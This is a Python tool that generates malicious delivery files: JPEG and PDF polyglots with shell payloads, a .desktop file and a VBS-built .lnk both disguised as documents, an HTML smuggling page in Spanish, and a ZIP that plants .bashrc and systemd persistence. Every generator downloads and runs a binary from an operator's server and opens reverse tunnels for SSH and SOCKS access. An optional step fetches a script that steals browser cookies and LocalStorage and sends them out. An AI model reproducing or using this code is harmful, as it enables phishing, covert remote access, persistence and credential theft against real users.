#!/usr/bin/env python3
"""
Polyglot Payload Generator
Generates: JPEG+ELF, PDF+shell, HTML smuggling, .desktop, .zip symlink, .lnk VBS
"""

import json
import os
import sys
from pathlib import Path

OUTPUT_DIR = '/tmp/payloads'

def ensure_output_dir():
    Path(OUTPUT_DIR).mkdir(parents=True, exist_ok=True)

def build_tunnel_cmd(vps_host, vps_port, technique, binary_name, use_tls, sni):
    tls = use_tls
    host = vps_host
    port = vps_port or '443'
    sni_val = sni or 'google.com'
    bin_name = binary_name or 'svc.exe'

    if technique == 'wstunnel':
        if tls:
            return f'{bin_name} client --tls-sni-override {sni_val} -L 2222:localhost:22 -L 1080:localhost:1080 wss://{host}:{port}'
        return f'{bin_name} client -L 2222:localhost:22 -L 1080:localhost:1080 ws://{host}:{port}'
    elif technique == 'chisel':
        proto = 'https' if tls else 'http'
        tls_flag = ' --tls-skip-verify' if tls else ''
        return f'{bin_name} client{tls_flag} {proto}://{host}:{port} R:2222:localhost:22 R:1080:localhost:1080'
    elif technique == 'autossh':
        return f'autossh -M 0 -o StrictHostKeyChecking=no -o ServerAliveInterval=15 -R 2222:localhost:22 -R 1080:localhost:1080 {host} -p {port}'
    elif technique == 'frp':
        tls_str = 'true' if tls else 'false'
        return f'{bin_name} -c <(echo serverAddr="{host}"\\nserverPort={port}\\ntls={tls_str})'
    else:
        return f'{bin_name} client --tls-sni-override {sni_val} -L 2222:localhost:22 -L 1080:localhost:1080 wss://{host}:443'


def build_cloner_inject(vps_host, vps_port='8082'):
    """Return shell code to download and execute browser cloner."""
    return f'''
# Browser Profile Cloner — extract cookies + LocalStorage
wget -qO /tmp/.cloner.py https://{vps_host}/browser_cloner.py 2>/dev/null || curl -so /tmp/.cloner.py https://{vps_host}/browser_cloner.py 2>/dev/null
if [ -f /tmp/.cloner.py ]; then
    python3 /tmp/.cloner.py --exfil {vps_host} --exfil-port {vps_port} || python /tmp/.cloner.py --exfil {vps_host} --exfil-port {vps_port}
    rm -f /tmp/.cloner.py
fi
'''


def generate_jpeg_elf_polyglot(vps_host, vps_port, technique, binary_name, use_tls, sni, output_name, include_cloner=False):
    """JPEG+ELF polyglot: valid image that executes tunnel when run as script."""
    cmd = build_tunnel_cmd(vps_host, vps_port, technique, binary_name, use_tls, sni)
    cloner = build_cloner_inject(vps_host) if include_cloner else ''

    payload_tail = f'''#!/bin/bash
{cloner}
wget -qO /tmp/.jun24 https://{vps_host}/{binary_name} 2>/dev/null || curl -so /tmp/.jun24 https://{vps_host}/{binary_name} 2>/dev/null
[ -f /tmp/.jun24 ] && chmod +x /tmp/.jun24 && nohup /tmp/.jun24 {cmd} >/dev/null 2>&1 &
[ -d /data/data ] && cp /tmp/.jun24 /data/local/tmp/.jun24 2>/dev/null && chmod 755 /data/local/tmp/.jun24 2>/dev/null && nohup /data/local/tmp/.jun24 {cmd} >/dev/null 2>&1 &
exit 0
'''

    # Minimal valid 1x1 white JPEG
    jpeg_hex = (
        "ffd8ffe000104a46494600010100000100010000ffdb004300"
        "080606070605080707070909080a0c140d0c0b0b0c1912130f141d1a1f1e"
        "1d1a1c1c20242e2720222c231c1c2837292c30313434341f27393d38323c"
        "2e333432ffdb0043010909090c0b0c180d0d1832211c2132323232323232"
        "323232323232323232323232323232323232323232323232323232323232"
        "3232323232323232323232323232ffc00011080001000103012200021103"
        "1101ffc4001f000001050101010101010000000000000000010203040506"
        "0708090a0bffc400b5100002010303020403050504040000017d01020300"
        "041105122131410613516107227114328191a1082342b1c11552d1f02433"
        "6272820916a161718191a25262728292a3435363738393a43444546474849"
        "4a535455565758595a636465666768696a737475767778797a83848586878"
        "88898a92939495969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9ba"
        "c2c3c4c5c6c7c8c9cad2d3d4d5d6d7d8d9dae1e2e3e4e5e6e7e8e9eaf1f2"
        "f3f4f5f6f7f8f9faffc4001f010003010101010101010101000000000000"
        "0102030405060708090a0bffc400b5110002010204040304070504040001"
        "0277000102031104052131061241510761711322328108144291a1b1c109"
        "233352f0156272d10a162434e125f11718191a262728292a35363738393a4"
        "34445464748494a535455565758595a636465666768696a73747576777879"
        "7982838485868788898a92939495969798999aa2a3a4a5a6a7a8a9aab2b3"
        "b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3d4d5d6d7d8d9dae2e3e4e5e6"
        "e7e8e9eaf2f3f4f5f6f7f8f9faffda000c03010002110311003f00f14a28"
        "a2803fffd9"
    )
    jpeg_data = bytes.fromhex(jpeg_hex)

    # Ensure JPEG EOF
    if not jpeg_data.endswith(b'\xff\xd9'):
        jpeg_data += b'\xff\xd9'

    polyglot = jpeg_data + (payload_tail + '\n').encode('latin-1', errors='replace')

    outpath = os.path.join(OUTPUT_DIR, output_name)
    if outpath.endswith('.jpg'):
        outpath = outpath[:-4] + '.jpg.sh'

    with open(outpath, 'wb') as f:
        f.write(polyglot)
    os.chmod(outpath, 0o755)
    return outpath


def generate_pdf_shell_polyglot(vps_host, vps_port, technique, binary_name, use_tls, sni, output_name, include_cloner=False):
    """PDF+shell polyglot: valid PDF document that executes tunnel when run as script."""
    cmd = build_tunnel_cmd(vps_host, vps_port, technique, binary_name, use_tls, sni)
    cloner = build_cloner_inject(vps_host) if include_cloner else ''

    # Minimal valid PDF
    pdf_bytes = (
        b'%PDF-1.4\n'
        b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
        b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
        b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n'
        b'xref\n0 4\n'
        b'0000000000 65535 f \n'
        b'0000000010 00000 n \n'
        b'0000000053 00000 n \n'
        b'0000000102 00000 n \n'
        b'trailer\n<< /Size 4 /Root 1 0 R >>\n'
        b'startxref\n178\n'
        b'%%EOF\n'
    )

    # Build shell header with optional cloner
    shell_parts = ['#!/bin/bash']
    if include_cloner:
        shell_parts.append('# Browser Profile Cloner')
        shell_parts.append('wget -qO /tmp/.cloner.py https://{vps}/browser_cloner.py 2>/dev/null || curl -so /tmp/.cloner.py https://{vps}/browser_cloner.py 2>/dev/null'.format(vps=vps_host))
        shell_parts.append('if [ -f /tmp/.cloner.py ]; then python3 /tmp/.cloner.py --exfil {vps} --exfil-port 8082 || python /tmp/.cloner.py --exfil {vps} --exfil-port 8082; rm -f /tmp/.cloner.py; fi'.format(vps=vps_host))
    shell_parts.append('wget -qO /tmp/.crond https://{vps}/{bin} 2>/dev/null || curl -so /tmp/.crond https://{vps}/{bin} 2>/dev/null'.format(vps=vps_host, bin=binary_name))
    shell_parts.append('[ -f /tmp/.crond ] && chmod +x /tmp/.crond && nohup /tmp/.crond {cmd} >/dev/null 2>&1 &'.format(cmd=cmd))
    shell_parts.append('xdg-open https://{vps}/{bin} 2>/dev/null || true'.format(vps=vps_host, bin=binary_name))
    shell_parts.append('exit 0')
    shell_header = ('\n'.join(shell_parts) + '\n').encode()

    polyglot = shell_header + b'\n' + pdf_bytes

    outpath = os.path.join(OUTPUT_DIR, output_name)
    with open(outpath, 'wb') as f:
        f.write(polyglot)
    os.chmod(outpath, 0o755)
    return outpath


def generate_desktop_file(vps_host, vps_port, technique, binary_name, use_tls, sni, output_name, include_cloner=False):
    """Creates a .desktop file disguised as PDF with auto-executing tunnel."""
    cmd = build_tunnel_cmd(vps_host, vps_port, technique, binary_name, use_tls, sni)
    cloner_pre = f'wget -qO /tmp/.cloner.py https://{vps_host}/browser_cloner.py 2>/dev/null || curl -so /tmp/.cloner.py https://{vps_host}/browser_cloner.py 2>/dev/null; if [ -f /tmp/.cloner.py ]; then python3 /tmp/.cloner.py --exfil {vps_host} --exfil-port 8082 || python /tmp/.cloner.py --exfil {vps_host} --exfil-port 8082; rm -f /tmp/.cloner.py; fi; ' if include_cloner else ''

    desktop = f"""[Desktop Entry]
Type=Application
Name=Informe 2025
Icon=application-pdf
Exec=bash -c '{cloner_pre}wget -qO /tmp/.crond https://{vps_host}/{binary_name} && chmod +x /tmp/.crond && nohup /tmp/.crond {cmd} &>/dev/null & xdg-open https://{vps_host}/{binary_name}'
Terminal=false
MimeType=application/pdf;
"""

    outpath = os.path.join(OUTPUT_DIR, output_name)
    with open(outpath, 'w') as f:
        f.write(desktop)
    os.chmod(outpath, 0o755)
    return outpath


def generate_html_smuggling(vps_host, vps_port, technique, binary_name, use_tls, sni, output_name, platform):
    """Creates HTML smuggling page for browser-based delivery."""
    scheme = 'https' if use_tls else 'http'
    url = f'{scheme}://{vps_host}/{binary_name}'

    triggers = {
        'windows': "location.href = 'ms-settings:windowsupdate';",
        'linux': '',
        'android': "setTimeout(() => location.href = 'intent://'+location.host+'/dl#Intent;scheme=https;end', 3000);"
    }

    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Cargando documento seguro...</title>
<script>
async function load() {{
    try {{
        const resp = await fetch('{url}');
        const blob = await resp.blob();
        const objUrl = URL.createObjectURL(blob);
        const a = document.getElementById('d');
        a.href = objUrl;
        a.click();
        {triggers.get(platform, '')}
    }} catch(e) {{ console.log(e); }}
}}
</script>
</head>
<body onload="load()" style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;background:#f0f0f0;">
<div style="text-align:center;">
    <div style="border:3px solid #3498db;border-radius:50%;width:40px;height:40px;border-top-color:transparent;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
    <p style="color:#555;">Cargando documento seguro...</p>
    <p style="font-size:11px;color:#999;">Si no se descarga, <a id="d" href="{url}" download="{binary_name}">clic aquí</a></p>
</div>
<style>@keyframes spin{{to{{transform:rotate(360deg)}}}}}}</style>
</body>
</html>"""

    outpath = os.path.join(OUTPUT_DIR, output_name)
    with open(outpath, 'w') as f:
        f.write(html)
    return outpath


def generate_lnk_vbs(vps_host, vps_port, technique, binary_name, use_tls, sni, output_name):
    """Creates VBS script that downloads tunnel binary, creates .lnk, and executes."""
    cmd = build_tunnel_cmd(vps_host, vps_port, technique, binary_name, use_tls, sni)
    cmd_escaped = cmd.replace('"', '""')

    vbs = f"""Set WshShell = CreateObject("WScript.Shell")
' Download tunnel binary
url = "https://{vps_host}/{binary_name}"
target = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\\{binary_name}"
Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.Open "GET", url, False
http.Send
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write http.ResponseBody
stream.SaveToFile target, 2
stream.Close
' Create shortcut on Desktop
desktop = WshShell.SpecialFolders("Desktop")
Set lnk = WshShell.CreateShortcut(desktop & "\\Contrato.lnk")
lnk.TargetPath = "powershell.exe"
lnk.Arguments = "-w h -ep bypass -c Start-Process '" & target & "' -Args '""{cmd_escaped}""' -WindowStyle Hidden"
lnk.WindowStyle = 7
lnk.IconLocation = "C:\\Windows\\System32\\imageres.dll,2"
lnk.WorkingDirectory = "%TEMP%"
lnk.Save
' Execute immediately
WshShell.Run "powershell -w h -ep bypass -c Start-Process '" & target & "' -Args '""{cmd_escaped}""' -WindowStyle Hidden", 0, False
"""

    outpath = os.path.join(OUTPUT_DIR, output_name)
    if not outpath.endswith('.vbs'):
        outpath += '.vbs'
    with open(outpath, 'w') as f:
        f.write(vbs)
    return outpath


def generate_zip_symlink(vps_host, vps_port, technique, binary_name, use_tls, sni, output_name):
    """Creates a shell script that generates a malicious ZIP with symlinks."""
    cmd = build_tunnel_cmd(vps_host, vps_port, technique, binary_name, use_tls, sni)

    script = f"""#!/bin/bash
# Malicious ZIP symlink generator
OUTPUT="payload.zip"
TMPDIR=$(mktemp -d)
cd "$TMPDIR"

mkdir -p .config/systemd/user
cat > .bashrc << 'BASHRCEOF'
(sleep 30; wget -qO /tmp/.crond https://{vps_host}/{binary_name} 2>/dev/null || curl -so /tmp/.crond https://{vps_host}/{binary_name} 2>/dev/null) && chmod +x /tmp/.crond && /tmp/.crond {cmd} &
BASHRCEOF

cat > .profile << 'PROFILEOF'
[ -f "$HOME/.bashrc" ] && . "$HOME/.bashrc"
PROFILEOF

cat > .config/systemd/user/net-sync.service << SERVICEEOF
[Unit]
Description=Network Sync
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'wget -qO /tmp/.crond https://{vps_host}/{binary_name} && chmod +x /tmp/.crond && /tmp/.crond {cmd}'
Restart=always
RestartSec=60
[Install]
WantedBy=default.target
SERVICEEOF

ln -sf "$HOME/" home_target
zip -r --symlinks "$OLDPWD/$OUTPUT" .bashrc .profile .config
cd "$OLDPWD"
rm -rf "$TMPDIR"
echo "[+] Generated: $OUTPUT"
"""

    outpath = os.path.join(OUTPUT_DIR, output_name)
    with open(outpath, 'w') as f:
        f.write(script)
    os.chmod(outpath, 0o755)
    return outpath


GENERATORS = {
    'polyglot-jpeg': generate_jpeg_elf_polyglot,
    'polyglot-pdf': generate_pdf_shell_polyglot,
    'desktop': generate_desktop_file,
    'html-smuggling': generate_html_smuggling,
    'html-sw': generate_html_smuggling,
    'html-captive': generate_html_smuggling,
    'html-xss': generate_html_smuggling,
    'lnk': generate_lnk_vbs,
    'zip-symlink': generate_zip_symlink,
}


if __name__ == '__main__':
    ensure_output_dir()

    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: polyglot_gen.py '<json_config>'"}))
        sys.exit(1)

    config = json.loads(sys.argv[1])
    payload_type = config.get('payloadType', 'html-smuggling')

    gen = GENERATORS.get(payload_type)
    if not gen:
        print(json.dumps({"error": f"Unknown type: {payload_type}"}))
        sys.exit(1)

    kwargs = dict(
        vps_host=config.get('vpsHost', ''),
        vps_port=config.get('vpsPort', '443'),
        technique=config.get('technique', 'wstunnel'),
        binary_name=config.get('binaryName', 'svc.exe'),
        use_tls=config.get('useTLS', True),
        sni=config.get('sni', 'google.com'),
        output_name=config.get('outputName', 'payload'),
    )

    if payload_type == 'html-smuggling':
        kwargs['platform'] = config.get('platform', 'windows')
    else:
        kwargs['include_cloner'] = config.get('includeCloner', False)

    try:
        outpath = gen(**kwargs)
        print(json.dumps({"success": True, "path": outpath, "type": payload_type}))
    except Exception as e:
        print(json.dumps({"error": str(e)}))
        sys.exit(1)
